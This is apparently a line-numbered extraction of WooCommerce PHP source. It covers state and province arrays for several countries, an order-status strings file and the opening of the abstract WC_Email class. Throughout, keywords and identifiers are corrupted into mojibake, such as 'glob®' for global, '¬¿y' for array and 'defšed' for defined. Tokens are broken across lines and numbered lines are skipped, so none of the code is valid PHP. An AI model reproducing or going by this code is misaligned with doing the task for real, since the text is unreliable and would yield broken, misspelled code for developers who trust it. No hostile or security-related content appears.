42 'JP30' => 
__
( 'Wakayama', 'woocommerce' ),

43 'JP31' => 
__
( 'Tottori', 'woocommerce' ),

44 'JP32' => 
__
( 'Shimane', 'woocommerce' ),

45 'JP33' => 
__
( 'Okayama', 'woocommerce' ),

46 'JP34' => 
__
( 'Hiroshima', 'woocommerce' ),

47 'JP35' => 
__
( 'Yamaguchi', 'woocommerce' ),

48 'JP36' => 
__
( 'Tokushima', 'woocommerce' ),

49 'JP37' => 
__
( 'Kagawa', 'woocommerce' ),

50 'JP38' => 
__
( 'Ehime', 'woocommerce' ),

51 'JP39' => 
__
( 'Kochi', 'woocommerce' ),

52 'JP40' => 
__
( 'Fukuoka', 'woocommerce' ),

53 'JP41' => 
__
( 'Saga', 'woocommerce' ),

54 'JP42' => 
__
( 'Nagasaki', 'woocommerce' ),

55 'JP43' => 
__
( 'Kumamoto', 'woocommerce' ),

56 'JP44' => 
__
( 'Oita', 'woocommerce' ),

57 'JP45' => 
__
( 'Miyazaki', 'woocommerce' ),

58 'JP46' => 
__
( 'Kagoshima', 'woocommerce' ),

59 'JP47' => 
__
( 'Okinawa', 'woocommerce' ),

	@i18n/states/MY.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['MY'] = 
¬¿y
(

13 'JHR' => 
__
( 'Johor', 'woocommerce' ),

14 'KDH' => 
__
( 'Kedah', 'woocommerce' ),

15 'KTN' => 
__
( 'Kelantan', 'woocommerce' ),

16 'MLK' => 
__
( 'Melaka', 'woocommerce' ),

17 'NSN' => 
__
( 'Negeri Sembilan', 'woocommerce' ),

18 'PHG' => 
__
( 'Pahang', 'woocommerce' ),

19 'PRK' => 
__
( 'Perak', 'woocommerce' ),

20 'PLS' => 
__
( 'Perlis', 'woocommerce' ),

21 'PNG' => 
__
( 'Pulau Pinang', 'woocommerce' ),

22 'SBH' => 
__
( 'Sabah', 'woocommerce' ),

23 'SWK' => 
__
( 'Sarawak', 'woocommerce' ),

24 'SGR' => 
__
( 'Selangor', 'woocommerce' ),

25 'TRG' => 
__
( 'Terengganu', 'woocommerce' ),

26 'KUL' => 
__
( 'W.P. Kuala Lumpur', 'woocommerce' ),

27 'LBN' => 
__
( 'W.P. Labuan', 'woocommerce' ),

28 'PJY' => 
__
( 'W.P. Putrajaya', 'woocommerce' )

	@i18n/states/NZ.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['NZ'] = 
¬¿y
(

13 'NL' => 
__
( 'Northland', 'woocommerce' ),

14 'AK' => 
__
( 'Auckland', 'woocommerce' ),

15 'WA' => 
__
( 'Waikato', 'woocommerce' ),

16 'BP' => 
__
( 'Bay of Plenty', 'woocommerce' ),

17 'TK' => 
__
( 'Taranaki', 'woocommerce' ),

18 'HB' => 
__
( 'Hawke&rsquo;s Bay', 'woocommerce' ),

19 'MW' => 
__
( 'Manawatu-Wanganui', 'woocommerce' ),

20 'WE' => 
__
( 'Wellington', 'woocommerce' ),

21 'NS' => 
__
( 'Nelson', 'woocommerce' ),

22 'MB' => 
__
( 'Marlborough', 'woocommerce' ),

23 'TM' => 
__
( 'Tasman', 'woocommerce' ),

24 'WC' => 
__
( 'West Coast', 'woocommerce' ),

25 'CT' => 
__
( 'Canterbury', 'woocommerce' ),

26 'OT' => 
__
( 'Otago', 'woocommerce' ),

27 'SL' => 
__
( 'Southland', 'woocommerce')

	@i18n/states/PE.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['PE'] = 
¬¿y
(

13 'CAL' => 
__
( 'El Callao', 'woocommerce' ),

14 'LMA' => 
__
( 'Municipalidad Metropolitana de Lima', 'woocommerce' ),

15 'AMA' => 
__
( 'Amazonas', 'woocommerce' ),

16 'ANC' => 
__
( 'Ancash', 'woocommerce' ),

17 'APU' => 
__
( 'Apur&iacute;mac', 'woocommerce' ),

18 'ARE' => 
__
( 'Arequipa', 'woocommerce' ),

19 'AYA' => 
__
( 'Ayacucho', 'woocommerce' ),

20 'CAJ' => 
__
( 'Cajamarca', 'woocommerce' ),

21 'CUS' => 
__
( 'Cusco', 'woocommerce' ),

22 'HUV' => 
__
( 'Huancavelica', 'woocommerce' ),

23 'HUC' => 
__
( 'Hu&aacute;nuco', 'woocommerce' ),

24 'ICA' => 
__
( 'Ica', 'woocommerce' ),

25 'JUN' => 
__
( 'Jun&iacute;n', 'woocommerce' ),

26 'LAL' => 
__
( 'La Libertad', 'woocommerce' ),

27 'LAM' => 
__
( 'Lambayeque', 'woocommerce' ),

28 'LIM' => 
__
( 'Lima', 'woocommerce' ),

29 'LOR' => 
__
( 'Loreto', 'woocommerce' ),

30 'MDD' => 
__
( 'Madre de Dios', 'woocommerce' ),

31 'MOQ' => 
__
( 'Moquegua', 'woocommerce' ),

32 'PAS' => 
__
( 'Pasco', 'woocommerce' ),

33 'PIU' => 
__
( 'Piura', 'woocommerce' ),

34 'PUN' => 
__
( 'Puno', 'woocommerce' ),

35 'SAM' => 
__
( 'San Mart&iacute;n', 'woocommerce' ),

36 'TAC' => 
__
( 'Tacna', 'woocommerce' ),

37 'TUM' => 
__
( 'Tumbes', 'woocommerce' ),

38 'UCA' => 
__
( 'Ucayali', 'woocommerce' )

	@i18n/states/TH.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['TH'] = 
¬¿y
(

13 'TH-37' => 
__
( 'Amnat Charoen (&#3629;&#3635;&#3609;&#3634;&#3592;&#3648;&#3592;&#3619;&#3636;&#3597;)', 'woocommerce' ),

14 'TH-15' => 
__
( 'Ang Thong (&#3629;&#3656;&#3634;&#3591;&#3607;&#3629;&#3591;)', 'woocommerce' ),

15 'TH-14' => 
__
( 'Ayutthaya (&#3614;&#3619;&#3632;&#3609;&#3588;&#3619;&#3624;&#3619;&#3637;&#3629;&#3618;&#3640;&#3608;&#3618;&#3634;)', 'woocommerce' ),

16 'TH-10' => 
__
( 'Bangkok (&#3585;&#3619;&#3640;&#3591;&#3648;&#3607;&#3614;&#3617;&#3627;&#3634;&#3609;&#3588;&#3619;)', 'woocommerce' ),

17 'TH-38' => 
__
( 'Bueng Kan (&#3610;&#3638;&#3591;&#3585;&#3634;&#3628;)', 'woocommerce' ),

18 'TH-31' => 
__
( 'Buri Ram (&#3610;&#3640;&#3619;&#3637;&#3619;&#3633;&#3617;&#3618;&#3660;)', 'woocommerce' ),

19 'TH-24' => 
__
( 'Chachoengsao (&#3593;&#3632;&#3648;&#3594;&#3636;&#3591;&#3648;&#3607;&#3619;&#3634;)', 'woocommerce' ),

20 'TH-18' => 
__
( 'Chai Nat (&#3594;&#3633;&#3618;&#3609;&#3634;&#3607;)', 'woocommerce' ),

21 'TH-36' => 
__
( 'Chaiyaphum (&#3594;&#3633;&#3618;&#3616;&#3641;&#3617;&#3636;)', 'woocommerce' ),

22 'TH-22' => 
__
( 'Chanthaburi (&#3592;&#3633;&#3609;&#3607;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

23 'TH-50' => 
__
( 'Chiang Mai (&#3648;&#3594;&#3637;&#3618;&#3591;&#3651;&#3627;&#3617;&#3656;)', 'woocommerce' ),

24 'TH-57' => 
__
( 'Chiang Rai (&#3648;&#3594;&#3637;&#3618;&#3591;&#3619;&#3634;&#3618;)', 'woocommerce' ),

25 'TH-20' => 
__
( 'Chonburi (&#3594;&#3621;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

26 'TH-86' => 
__
( 'Chumphon (&#3594;&#3640;&#3617;&#3614;&#3619;)', 'woocommerce' ),

27 'TH-46' => 
__
( 'Kalasin (&#3585;&#3634;&#3628;&#3626;&#3636;&#3609;&#3608;&#3640;&#3660;)', 'woocommerce' ),

28 'TH-62' => 
__
( 'Kamphaeng Phet (&#3585;&#3635;&#3649;&#3614;&#3591;&#3648;&#3614;&#3594;&#3619;)', 'woocommerce' ),

29 'TH-71' => 
__
( 'Kanchanaburi (&#3585;&#3634;&#3597;&#3592;&#3609;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

30 'TH-40' => 
__
( 'Khon Kaen (&#3586;&#3629;&#3609;&#3649;&#3585;&#3656;&#3609;)', 'woocommerce' ),

31 'TH-81' => 
__
( 'Krabi (&#3585;&#3619;&#3632;&#3610;&#3637;&#3656;)', 'woocommerce' ),

32 'TH-52' => 
__
( 'Lampang (&#3621;&#3635;&#3611;&#3634;&#3591;)', 'woocommerce' ),

33 'TH-51' => 
__
( 'Lamphun (&#3621;&#3635;&#3614;&#3641;&#3609;)', 'woocommerce' ),

34 'TH-42' => 
__
( 'Loei (&#3648;&#3621;&#3618;)', 'woocommerce' ),

35 'TH-16' => 
__
( 'Lopburi (&#3621;&#3614;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

36 'TH-58' => 
__
( 'Mae Hong Son (&#3649;&#3617;&#3656;&#3630;&#3656;&#3629;&#3591;&#3626;&#3629;&#3609;)', 'woocommerce' ),

37 'TH-44' => 
__
( 'Maha Sarakham (&#3617;&#3627;&#3634;&#3626;&#3634;&#3619;&#3588;&#3634;&#3617;)', 'woocommerce' ),

38 'TH-49' => 
__
( 'Mukdahan (&#3617;&#3640;&#3585;&#3604;&#3634;&#3627;&#3634;&#3619;)', 'woocommerce' ),

39 'TH-26' => 
__
( 'Nakhon Nayok (&#3609;&#3588;&#3619;&#3609;&#3634;&#3618;&#3585;)', 'woocommerce' ),

40 'TH-73' => 
__
( 'Nakhon Pathom (&#3609;&#3588;&#3619;&#3611;&#3600;&#3617;)', 'woocommerce' ),

41 'TH-48' => 
__
( 'Nakhon Phanom (&#3609;&#3588;&#3619;&#3614;&#3609;&#3617;)', 'woocommerce' ),

42 'TH-30' => 
__
( 'Nakhon Ratchasima (&#3609;&#3588;&#3619;&#3619;&#3634;&#3594;&#3626;&#3637;&#3617;&#3634;)', 'woocommerce' ),

43 'TH-60' => 
__
( 'Nakhon Sawan (&#3609;&#3588;&#3619;&#3626;&#3623;&#3619;&#3619;&#3588;&#3660;)', 'woocommerce' ),

44 'TH-80' => 
__
( 'Nakhon Si Thammarat (&#3609;&#3588;&#3619;&#3624;&#3619;&#3637;&#3608;&#3619;&#3619;&#3617;&#3619;&#3634;&#3594;)', 'woocommerce' ),

45 'TH-55' => 
__
( 'Nan (&#3609;&#3656;&#3634;&#3609;)', 'woocommerce' ),

46 'TH-96' => 
__
( 'Narathiwat (&#3609;&#3619;&#3634;&#3608;&#3636;&#3623;&#3634;&#3626;)', 'woocommerce' ),

47 'TH-39' => 
__
( 'Nong Bua Lam Phu (&#3627;&#3609;&#3629;&#3591;&#3610;&#3633;&#3623;&#3621;&#3635;&#3616;&#3641;)', 'woocommerce' ),

48 'TH-43' => 
__
( 'Nong Khai (&#3627;&#3609;&#3629;&#3591;&#3588;&#3634;&#3618;)', 'woocommerce' ),

49 'TH-12' => 
__
( 'Nonthaburi (&#3609;&#3609;&#3607;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

50 'TH-13' => 
__
( 'Pathum Thani (&#3611;&#3607;&#3640;&#3617;&#3608;&#3634;&#3609;&#3637;)', 'woocommerce' ),

51 'TH-94' => 
__
( 'Pattani (&#3611;&#3633;&#3605;&#3605;&#3634;&#3609;&#3637;)', 'woocommerce' ),

52 'TH-82' => 
__
( 'Phang Nga (&#3614;&#3633;&#3591;&#3591;&#3634;)', 'woocommerce' ),

53 'TH-93' => 
__
( 'Phatthalung (&#3614;&#3633;&#3607;&#3621;&#3640;&#3591;)', 'woocommerce' ),

54 'TH-56' => 
__
( 'Phayao (&#3614;&#3632;&#3648;&#3618;&#3634;)', 'woocommerce' ),

55 'TH-67' => 
__
( 'Phetchabun (&#3648;&#3614;&#3594;&#3619;&#3610;&#3641;&#3619;&#3603;&#3660;)', 'woocommerce' ),

56 'TH-76' => 
__
( 'Phetchaburi (&#3648;&#3614;&#3594;&#3619;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

57 'TH-66' => 
__
( 'Phichit (&#3614;&#3636;&#3592;&#3636;&#3605;&#3619;)', 'woocommerce' ),

58 'TH-65' => 
__
( 'Phitsanulok (&#3614;&#3636;&#3625;&#3603;&#3640;&#3650;&#3621;&#3585;)', 'woocommerce' ),

59 'TH-54' => 
__
( 'Phrae (&#3649;&#3614;&#3619;&#3656;)', 'woocommerce' ),

60 'TH-83' => 
__
( 'Phuket (&#3616;&#3641;&#3648;&#3585;&#3655;&#3605;)', 'woocommerce' ),

61 'TH-25' => 
__
( 'Prachin Buri (&#3611;&#3619;&#3634;&#3592;&#3637;&#3609;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

62 'TH-77' => 
__
( 'Prachuap Khiri Khan (&#3611;&#3619;&#3632;&#3592;&#3623;&#3610;&#3588;&#3637;&#3619;&#3637;&#3586;&#3633;&#3609;&#3608;&#3660;)', 'woocommerce' ),

63 'TH-85' => 
__
( 'Ranong (&#3619;&#3632;&#3609;&#3629;&#3591;)', 'woocommerce' ),

64 'TH-70' => 
__
( 'Ratchaburi (&#3619;&#3634;&#3594;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

65 'TH-21' => 
__
( 'Rayong (&#3619;&#3632;&#3618;&#3629;&#3591;)', 'woocommerce' ),

66 'TH-45' => 
__
( 'Roi Et (&#3619;&#3657;&#3629;&#3618;&#3648;&#3629;&#3655;&#3604;)', 'woocommerce' ),

67 'TH-27' => 
__
( 'Sa Kaeo (&#3626;&#3619;&#3632;&#3649;&#3585;&#3657;&#3623;)', 'woocommerce' ),

68 'TH-47' => 
__
( 'Sakon Nakhon (&#3626;&#3585;&#3621;&#3609;&#3588;&#3619;)', 'woocommerce' ),

69 'TH-11' => 
__
( 'Samut Prakan (&#3626;&#3617;&#3640;&#3607;&#3619;&#3611;&#3619;&#3634;&#3585;&#3634;&#3619;)', 'woocommerce' ),

70 'TH-74' => 
__
( 'Samut Sakhon (&#3626;&#3617;&#3640;&#3607;&#3619;&#3626;&#3634;&#3588;&#3619;)', 'woocommerce' ),

71 'TH-75' => 
__
( 'Samut Songkhram (&#3626;&#3617;&#3640;&#3607;&#3619;&#3626;&#3591;&#3588;&#3619;&#3634;&#3617;)', 'woocommerce' ),

72 'TH-19' => 
__
( 'Saraburi (&#3626;&#3619;&#3632;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

73 'TH-91' => 
__
( 'Satun (&#3626;&#3605;&#3641;&#3621;)', 'woocommerce' ),

74 'TH-17' => 
__
( 'Sing Buri (&#3626;&#3636;&#3591;&#3627;&#3660;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

75 'TH-33' => 
__
( 'Sisaket (&#3624;&#3619;&#3637;&#3626;&#3632;&#3648;&#3585;&#3625;)', 'woocommerce' ),

76 'TH-90' => 
__
( 'Songkhla (&#3626;&#3591;&#3586;&#3621;&#3634;)', 'woocommerce' ),

77 'TH-64' => 
__
( 'Sukhothai (&#3626;&#3640;&#3650;&#3586;&#3607;&#3633;&#3618;)', 'woocommerce' ),

78 'TH-72' => 
__
( 'Suphan Buri (&#3626;&#3640;&#3614;&#3619;&#3619;&#3603;&#3610;&#3640;&#3619;&#3637;)', 'woocommerce' ),

79 'TH-84' => 
__
( 'Surat Thani (&#3626;&#3640;&#3619;&#3634;&#3625;&#3598;&#3619;&#3660;&#3608;&#3634;&#3609;&#3637;)', 'woocommerce' ),

80 'TH-32' => 
__
( 'Surin (&#3626;&#3640;&#3619;&#3636;&#3609;&#3607;&#3619;&#3660;)', 'woocommerce' ),

81 'TH-63' => 
__
( 'Tak (&#3605;&#3634;&#3585;)', 'woocommerce' ),

82 'TH-92' => 
__
( 'Trang (&#3605;&#3619;&#3633;&#3591;)', 'woocommerce' ),

83 'TH-23' => 
__
( 'Trat (&#3605;&#3619;&#3634;&#3604;)', 'woocommerce' ),

84 'TH-34' => 
__
( 'Ubon Ratchathani (&#3629;&#3640;&#3610;&#3621;&#3619;&#3634;&#3594;&#3608;&#3634;&#3609;&#3637;)', 'woocommerce' ),

85 'TH-41' => 
__
( 'Udon Thani (&#3629;&#3640;&#3604;&#3619;&#3608;&#3634;&#3609;&#3637;)', 'woocommerce' ),

86 'TH-61' => 
__
( 'Uthai Thani (&#3629;&#3640;&#3607;&#3633;&#3618;&#3608;&#3634;&#3609;&#3637;)', 'woocommerce' ),

87 'TH-53' => 
__
( 'Uttaradit (&#3629;&#3640;&#3605;&#3619;&#3604;&#3636;&#3605;&#3606;&#3660;)', 'woocommerce' ),

88 'TH-95' => 
__
( 'Yala (&#3618;&#3632;&#3621;&#3634;)', 'woocommerce' ),

89 'TH-35' => 
__
( 'Yasothon (&#3618;&#3650;&#3626;&#3608;&#3619;)', 'woocommerce' )

	@i18n/states/TR.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['TR'] = 
¬¿y
(

13 'TR01' => 
__
( 'Adana', 'woocommerce' ),

14 'TR02' => 
__
( 'Ad&#305;yaman', 'woocommerce' ),

15 'TR03' => 
__
( 'Afyon', 'woocommerce' ),

16 'TR04' => 
__
( 'A&#287;r&#305;', 'woocommerce' ),

17 'TR05' => 
__
( 'Amasya', 'woocommerce' ),

18 'TR06' => 
__
( 'Ankara', 'woocommerce' ),

19 'TR07' => 
__
( 'Antalya', 'woocommerce' ),

20 'TR08' => 
__
( 'Artvin', 'woocommerce' ),

21 'TR09' => 
__
( 'Ayd&#305;n', 'woocommerce' ),

22 'TR10' => 
__
( 'Bal&#305;kesir', 'woocommerce' ),

23 'TR11' => 
__
( 'Bilecik', 'woocommerce' ),

24 'TR12' => 
__
( 'Bing&#246;l', 'woocommerce' ),

25 'TR13' => 
__
( 'Bitlis', 'woocommerce' ),

26 'TR14' => 
__
( 'Bolu', 'woocommerce' ),

27 'TR15' => 
__
( 'Burdur', 'woocommerce' ),

28 'TR16' => 
__
( 'Bursa', 'woocommerce' ),

29 'TR17' => 
__
( '&#199;anakkale', 'woocommerce' ),

30 'TR18' => 
__
( '&#199;ank&#305;r&#305;', 'woocommerce' ),

31 'TR19' => 
__
( '&#199;orum', 'woocommerce' ),

32 'TR20' => 
__
( 'Denizli', 'woocommerce' ),

33 'TR21' => 
__
( 'Diyarbak&#305;r', 'woocommerce' ),

34 'TR22' => 
__
( 'Edirne', 'woocommerce' ),

35 'TR23' => 
__
( 'Elaz&#305;&#287;', 'woocommerce' ),

36 'TR24' => 
__
( 'Erzincan', 'woocommerce' ),

37 'TR25' => 
__
( 'Erzurum', 'woocommerce' ),

38 'TR26' => 
__
( 'Eski&#351;ehir', 'woocommerce' ),

39 'TR27' => 
__
( 'Gaziantep', 'woocommerce' ),

40 'TR28' => 
__
( 'Giresun', 'woocommerce' ),

41 'TR29' => 
__
( 'G&#252;m&#252;&#351;hane', 'woocommerce' ),

42 'TR30' => 
__
( 'Hakkari', 'woocommerce' ),

43 'TR31' => 
__
( 'Hatay', 'woocommerce' ),

44 'TR32' => 
__
( 'Isparta', 'woocommerce' ),

45 'TR33' => 
__
( '&#304;&#231;el', 'woocommerce' ),

46 'TR34' => 
__
( '&#304;stanbul', 'woocommerce' ),

47 'TR35' => 
__
( '&#304;zmir', 'woocommerce' ),

48 'TR36' => 
__
( 'Kars', 'woocommerce' ),

49 'TR37' => 
__
( 'Kastamonu', 'woocommerce' ),

50 'TR38' => 
__
( 'Kayseri', 'woocommerce' ),

51 'TR39' => 
__
( 'K&#305;rklareli', 'woocommerce' ),

52 'TR40' => 
__
( 'K&#305;r&#351;ehir', 'woocommerce' ),

53 'TR41' => 
__
( 'Kocaeli', 'woocommerce' ),

54 'TR42' => 
__
( 'Konya', 'woocommerce' ),

55 'TR43' => 
__
( 'K&#252;tahya', 'woocommerce' ),

56 'TR44' => 
__
( 'Malatya', 'woocommerce' ),

57 'TR45' => 
__
( 'Manisa', 'woocommerce' ),

58 'TR46' => 
__
( 'Kahramanmara&#351;', 'woocommerce' ),

59 'TR47' => 
__
( 'Mardin', 'woocommerce' ),

60 'TR48' => 
__
( 'Mu&#287;la', 'woocommerce' ),

61 'TR49' => 
__
( 'Mu&#351;', 'woocommerce' ),

62 'TR50' => 
__
( 'Nev&#351;ehir', 'woocommerce' ),

63 'TR51' => 
__
( 'Ni&#287;de', 'woocommerce' ),

64 'TR52' => 
__
( 'Ordu', 'woocommerce' ),

65 'TR53' => 
__
( 'Rize', 'woocommerce' ),

66 'TR54' => 
__
( 'Sakarya', 'woocommerce' ),

67 'TR55' => 
__
( 'Samsun', 'woocommerce' ),

68 'TR56' => 
__
( 'Siirt', 'woocommerce' ),

69 'TR57' => 
__
( 'Sinop', 'woocommerce' ),

70 'TR58' => 
__
( 'Sivas', 'woocommerce' ),

71 'TR59' => 
__
( 'Tekirda&#287;', 'woocommerce' ),

72 'TR60' => 
__
( 'Tokat', 'woocommerce' ),

73 'TR61' => 
__
( 'Trabzon', 'woocommerce' ),

74 'TR62' => 
__
( 'Tunceli', 'woocommerce' ),

75 'TR63' => 
__
( '&#350;anl&#305;urfa', 'woocommerce' ),

76 'TR64' => 
__
( 'U&#351;ak', 'woocommerce' ),

77 'TR65' => 
__
( 'Van', 'woocommerce' ),

78 'TR66' => 
__
( 'Yozgat', 'woocommerce' ),

79 'TR67' => 
__
( 'Zonguldak', 'woocommerce' ),

80 'TR68' => 
__
( 'Aksaray', 'woocommerce' ),

81 'TR69' => 
__
( 'Bayburt', 'woocommerce' ),

82 'TR70' => 
__
( 'Karaman', 'woocommerce' ),

83 'TR71' => 
__
( 'K&#305;r&#305;kkale', 'woocommerce' ),

84 'TR72' => 
__
( 'Batman', 'woocommerce' ),

85 'TR73' => 
__
( '&#350;&#305;rnak', 'woocommerce' ),

86 'TR74' => 
__
( 'Bart&#305;n', 'woocommerce' ),

87 'TR75' => 
__
( 'Ardahan', 'woocommerce' ),

88 'TR76' => 
__
( 'I&#287;d&#305;r', 'woocommerce' ),

89 'TR77' => 
__
( 'Yalova', 'woocommerce' ),

90 'TR78' => 
__
( 'Karab&#252;k', 'woocommerce' ),

91 'TR79' => 
__
( 'Kilis', 'woocommerce' ),

92 'TR80' => 
__
( 'Osmaniye', 'woocommerce' ),

93 'TR81' => 
__
( 'D&#252;zce', 'woocommerce' ),

	@i18n/states/US.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['US'] = 
¬¿y
(

13 'AL' => 
__
( 'Alabama', 'woocommerce' ),

14 'AK' => 
__
( 'Alaska', 'woocommerce' ),

15 'AZ' => 
__
( 'Arizona', 'woocommerce' ),

16 'AR' => 
__
( 'Arkansas', 'woocommerce' ),

17 'CA' => 
__
( 'California', 'woocommerce' ),

18 'CO' => 
__
( 'Colorado', 'woocommerce' ),

19 'CT' => 
__
( 'Connecticut', 'woocommerce' ),

20 'DE' => 
__
( 'Delaware', 'woocommerce' ),

21 'DC' => 
__
( 'District Of Columbia', 'woocommerce' ),

22 'FL' => 
__
( 'Florida', 'woocommerce' ),

23 'GA' => 
__
( 'Georgia', 'woocommerce' ),

24 'HI' => 
__
( 'Hawaii', 'woocommerce' ),

25 'ID' => 
__
( 'Idaho', 'woocommerce' ),

26 'IL' => 
__
( 'Illinois', 'woocommerce' ),

27 'IN' => 
__
( 'Indiana', 'woocommerce' ),

28 'IA' => 
__
( 'Iowa', 'woocommerce' ),

29 'KS' => 
__
( 'Kansas', 'woocommerce' ),

30 'KY' => 
__
( 'Kentucky', 'woocommerce' ),

31 'LA' => 
__
( 'Louisiana', 'woocommerce' ),

32 'ME' => 
__
( 'Maine', 'woocommerce' ),

33 'MD' => 
__
( 'Maryland', 'woocommerce' ),

34 'MA' => 
__
( 'Massachusetts', 'woocommerce' ),

35 'MI' => 
__
( 'Michigan', 'woocommerce' ),

36 'MN' => 
__
( 'Minnesota', 'woocommerce' ),

37 'MS' => 
__
( 'Mississippi', 'woocommerce' ),

38 'MO' => 
__
( 'Missouri', 'woocommerce' ),

39 'MT' => 
__
( 'Montana', 'woocommerce' ),

40 'NE' => 
__
( 'Nebraska', 'woocommerce' ),

41 'NV' => 
__
( 'Nevada', 'woocommerce' ),

42 'NH' => 
__
( 'New Hampshire', 'woocommerce' ),

43 'NJ' => 
__
( 'New Jersey', 'woocommerce' ),

44 'NM' => 
__
( 'New Mexico', 'woocommerce' ),

45 'NY' => 
__
( 'New York', 'woocommerce' ),

46 'NC' => 
__
( 'North Carolina', 'woocommerce' ),

47 'ND' => 
__
( 'North Dakota', 'woocommerce' ),

48 'OH' => 
__
( 'Ohio', 'woocommerce' ),

49 'OK' => 
__
( 'Oklahoma', 'woocommerce' ),

50 'OR' => 
__
( 'Oregon', 'woocommerce' ),

51 'PA' => 
__
( 'Pennsylvania', 'woocommerce' ),

52 'RI' => 
__
( 'Rhode Island', 'woocommerce' ),

53 'SC' => 
__
( 'South Carolina', 'woocommerce' ),

54 'SD' => 
__
( 'South Dakota', 'woocommerce' ),

55 'TN' => 
__
( 'Tennessee', 'woocommerce' ),

56 'TX' => 
__
( 'Texas', 'woocommerce' ),

57 'UT' => 
__
( 'Utah', 'woocommerce' ),

58 'VT' => 
__
( 'Vermont', 'woocommerce' ),

59 'VA' => 
__
( 'Virginia', 'woocommerce' ),

60 'WA' => 
__
( 'Washington', 'woocommerce' ),

61 'WV' => 
__
( 'West Virginia', 'woocommerce' ),

62 'WI' => 
__
( 'Wisconsin', 'woocommerce' ),

63 'WY' => 
__
( 'Wyoming', 'woocommerce' ),

64 'AA' => 
__
( 'Armed Forces (AA)', 'woocommerce' ),

65 'AE' => 
__
( 'Armed Forces (AE)', 'woocommerce' ),

66 'AP' => 
__
( 'Armed Forces (AP)', 'woocommerce' ),

67 'AS' => 
__
( 'American Samoa', 'woocommerce' ),

68 'GU' => 
__
( 'Guam', 'woocommerce' ),

69 'MP' => 
__
( 'Northern Mariana Islands', 'woocommerce' ),

70 'PR' => 
__
( 'Puerto Rico', 'woocommerce' ),

71 'UM' => 
__
( 'US Minor Outlying Islands', 'woocommerce' ),

72 'VI' => 
__
( 'US Virgin Islands', 'woocommerce' ),

	@i18n/states/ZA.php

1 <?
php


10 
glob®
 
	g$¡©es
;

12 
	g$¡©es
['ZA'] = 
¬¿y
(

13 'EC' => 
__
( 'Eastern Cape', 'woocommerce' ) ,

14 'FS' => 
__
( 'Free State', 'woocommerce' ) ,

15 'GP' => 
__
( 'Gauteng', 'woocommerce' ) ,

16 'KZN' => 
__
( 'KwaZulu-Natal', 'woocommerce' ) ,

17 'LP' => 
__
( 'Limpopo', 'woocommerce' ) ,

18 'MP' => 
__
( 'Mpumalanga', 'woocommerce' ) ,

19 'NC' => 
__
( 'Northern Cape', 'woocommerce' ) ,

20 'NW' => 
__
( 'North West', 'woocommerce' ) ,

21 'WC' => 
__
( 'Western Cape', 'woocommerce' )

	@i18n/strings.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 
__
( 'pending', 'woocommerce' );

17 
__
( 'failed', 'woocommerce' );

18 
__
( 'on-hold', 'woocommerce' );

19 
__
( 'processing', 'woocommerce' );

20 
__
( 'completed', 'woocommerce' );

21 
__
( 'refunded', 'woocommerce' );

22 
__
( 'cancelled', 'woocommerce' );

	@includes/abstracts/abstract-wc-email.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

17 
ab¡¿ù
 cÏs 
	cWC_Ema
 
ex‹nds
 
	mWC_S‘tšgs_API
 {

20 
v¬
 
	m$id
;

23 
v¬
 
	m$t™Ë
;

26 
v¬
 
	m$’abËd
;

29 
v¬
 
	m$desütiÚ
;

32 
v¬
 
	m$‹m¶©e_¶aš
;

35 
v¬
 
	m$‹m¶©e_html
;

38 
v¬
 
	m$‹m¶©e_ba£
;

41 
v¬
 
	m$»c›Á
;

44 
v¬
 
	m$h—dšg
;

47 
v¬
 
	m$subjeù
;

50 
v¬
 
	m$objeù
;

53 
v¬
 
	m$fšd
;

56 
v¬
 
	m$»¶aû
;

59 
v¬
 
	m$mime_bound¬y
;

62 
v¬
 
	m$mime_bound¬y_h—d”
;

65 
v¬
 
	m$£ndšg
;

76 
v¬
 
	m$¶aš_£¬ch
 = 
¬¿y
(

107 
v¬
 
	m$¶aš_»¶aû
 = 
¬¿y
(

135 
funùiÚ
 
	$__cÚ¡ruù
() {

138 
$this
->
	`š™_fÜm_f›lds
();

139 
$this
->
	`š™_£‰šgs
();

142 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_ema_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

145 iàĞ
	`is_nuÎ
Ğ
$this
->
‹m¶©e_ba£
 ) ) {

146 
$this
->
‹m¶©e_ba£
 = 
	`WC
()->
	`¶ugš_·th
() . '/templates/';

150 
$this
->
h—dšg
 = $this->
	`g‘_İtiÚ
( 'heading', $this->heading );

151 
$this
->
subjeù
 = $this->
	`g‘_İtiÚ
( 'subject', $this->subject );

152 
$this
->
ema_ty³
 = $this->
	`g‘_İtiÚ
( 'email_type' );

153 
$this
->
’abËd
 = $this->
	`g‘_İtiÚ
( 'enabled' );

156 
$this
->
fšd
 = 
	`¬¿y
( '{blogname}', '{site_title}' );

157 
$this
->
»¶aû
 = 
	`¬¿y
Ğ$this->
	`g‘_blogÇme
(), $this->get_blogname() );

160 
	`add_f‹r
Ğ'phpma”_š™', 
	`¬¿y
Ğ
$this
, 'handle_multipart' ) );

163 
	`add_f‹r
Ğ'woocomm”û_ema_¡yË_šlše_gs', 
	`¬¿y
Ğ
$this
, 'style_inline_tags' ) );

164 
	`add_f‹r
Ğ'woocomm”û_ema_¡yË_šlše_h1_g', 
	`¬¿y
Ğ
$this
, 'style_inline_h1_tag' ) );

165 
	`add_f‹r
Ğ'woocomm”û_ema_¡yË_šlše_h2_g', 
